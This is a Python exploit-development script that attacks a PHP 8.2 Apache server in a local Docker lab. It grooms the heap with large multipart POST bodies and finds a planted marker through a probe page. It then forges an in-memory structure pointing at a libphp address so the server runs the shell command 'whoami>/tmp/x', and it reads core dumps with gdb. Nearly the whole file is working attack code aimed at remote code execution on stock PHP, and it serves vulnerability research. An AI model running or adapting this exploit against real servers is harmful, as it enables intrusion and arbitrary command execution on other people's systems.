#!/usr/bin/env python3
"""oom121: HALF-NEEDLE honest aim + same-request armed fire.

oom120diag law: full 24B needle probes are POISONED — the probe's own
needle allocation reuses the marker's freed slot (self-copy ctx shows
it at the same VA). Fix: 32B marker, probe scans its two 16B halves
separately; the full 32B needle NEVER exists in probe memory, so a
half-hit with SKIP16 pre-context = the real marker location (probe
self-copies carry malloc-meta/zeros context — filtered).

Plan: shape(98-era) -> marker post (part13 256B value, 32B marker @8,
SKIP16 elsewhere; values 64B skip) -> half-needle probe -> B (legality
check: nib8==8, bit8==1, bit9==0; slide OFF over candidates if not) ->
ARMED post (identical shape; values 64B cell_of(B); part13 = cell run
with 184B block @OFF) -> own-request teardown walk -> segv/rdi//tmp/x.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
SKIP16 = b"\x02" * 16
PART = 13
K1 = 4200
NCELL = 4
V256 = 16
BLK = 0xB8
M32 = b"HALFNEEDLE123456" + b"QMARK7XY" * 2   # 32B
assert len(M32) == 32


def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def probe_hits(half):
    """Half-needle hits with 16B pre-context; real = ctx == SKIP16."""
    code, out = get("%s/oom_probe.php?h=%s&chunk=262144&maxc=8" % (HOST, half.hex()))
    hits = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("R="):
            continue
        for tok in re.findall(r"([0-9a-f]+)@ctx([0-9a-f]*)", line):
            addr = int(tok[0], 16)
            ctx = bytes.fromhex(tok[1]) if tok[1] else b""
            hits.append((addr, len(ctx) == 16 and ctx == SKIP16))
    return hits


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def decode_core(tag):
    host_copy = "/tmp/core121_%s" % tag
    c1 = subprocess.run(["docker", "cp", "php_vuln:/tmp/core", host_copy], capture_output=True)
    if c1.returncode != 0:
        return None
    subprocess.run(["docker", "cp", host_copy, "phpbuild:/tmp/core.121_%s" % tag], capture_output=True)
    open("/tmp/g121.gdb", "w").write("set pagination off\nset confirm off\nbt 3\ninfo registers rdi rip\nquit\n")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                        "gdb -q -batch -x /tmp/g121.gdb /tmp/libphp.stock.so /tmp/core.121_%s 2>&1 | grep -E '^rdi|^rip'" % tag],
                       capture_output=True, timeout=120)
    m = re.search(r"rdi\s+(0x[0-9a-f]+)", r.stdout.decode("latin1"))
    return m.group(1) if m else "?"


def cell_of(addr):
    return struct.pack("<Q", addr) * 2


def value256(marker=False, B=None, OFF=0):
    t = bytearray(SKIP16 * V256)
    if marker:
        t[OFF:OFF + 32] = M32
    else:
        st = struct.pack_into
        st("<II", t, OFF + 0x00, 1, 0x108)
        st("<II", t, OFF + 0x08, 1, 0)
        st("<Q", t, OFF + 0x10, 0)
        st("<Q", t, OFF + 0x18, B + 0x68)
        st("<I", t, OFF + 0x2C, 1)
        st("<Q", t, OFF + 0x50, B + 0x90)
        t[OFF + 0x58] = 6
        st("<I", t, OFF + 0x5C, 0x106)
        st("<Q", t, OFF + 0x68, 0)
        st("<Q", t, OFF + 0x70, BASE + ZIF)
        st("<IIQI", t, OFF + 0x90, 1, 0x106, 0, len(CMD))
        t[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        for s in range(0, 256, 16):
            if s + 16 <= 256 and not (OFF <= s < OFF + BLK):
                t[s:s + 16] = cell_of(B)
    return bytes(t)


def build_body(part13_val, other_val):
    ps = []
    for i in range(K1):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="'
                + SKIP16 * 190 + b"%d" % i + b'[x]"\r\n\r\n')
        val = part13_val if i == PART else other_val
        ps.append(head + val + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


print("=== oom121: half-needle honest aim ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock"
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped", flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# measure honestly: marker @8
c, _r = post_mod(build_body(value256(marker=True, OFF=8), SKIP16 * NCELL))
print("marker post: %s" % c, flush=True)
time.sleep(0.5)
h1 = [a for a, real in probe_hits(M32[0:16]) if real]
h2 = [a for a, real in probe_hits(M32[16:32]) if real]
print("half1 real=%s half2 real=%s" % (["0x%x" % a for a in h1], ["0x%x" % a for a in h2]), flush=True)
if h1 and h2:
    print("PAIRED: 0x%x + 16 = 0x%x (match=%s)" % (h1[0], h2[0] - 16, h1[0] == h2[0] - 16), flush=True)

B = None
if h1:
    cand = h1[0]
    if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
        B, OFF = cand, 8
    else:
        print("measured slot illegal bits (nib8=%d bit8=%d bit9=%d) -> force-OFF search skipped this boot"
              % (cand & 0xF, (cand >> 8) & 1, (cand >> 9) & 1), flush=True)

if B is not None:
    n0 = segv_count()
    ac, ar = post_mod(build_body(value256(B=B, OFF=OFF), cell_of(B)))
    time.sleep(2)
    d = segv_count() - n0
    core = sh("test -f /tmp/core && echo y") == "y"
    xf = sh("cat /tmp/x 2>&1")
    rdi = decode_core("armed") if core else "-"
    print("ARMED: %s segv+%d core=%s rdi=%s x=%s" % (ac, d, core, rdi, xf[:40]), flush=True)
    if "/tmp/x" in xf:
        print("!!! /tmp/x EXISTS - CAMPAIGN WON", flush=True)
else:
    # still fire with run-only values at measured slot (dispatch-density probe)
    if h1:
        other = cell_of(h1[0] & ~0xF)
        n0 = segv_count()
        ac, ar = post_mod(build_body(value256(B=h1[0] & ~0xF, OFF=8), other))
        time.sleep(2)
        d = segv_count() - n0
        core = sh("test -f /tmp/core && echo y") == "y"
        xf = sh("cat /tmp/x 2>&1")
        rdi = decode_core("run") if core else "-"
        print("RUNFIRE: %s segv+%d core=%s rdi=%s x=%s" % (ac, d, core, rdi, xf[:40]), flush=True)
    else:
        print("no honest measurement this boot - geometry drift", flush=True)

print("=== done ===", flush=True)
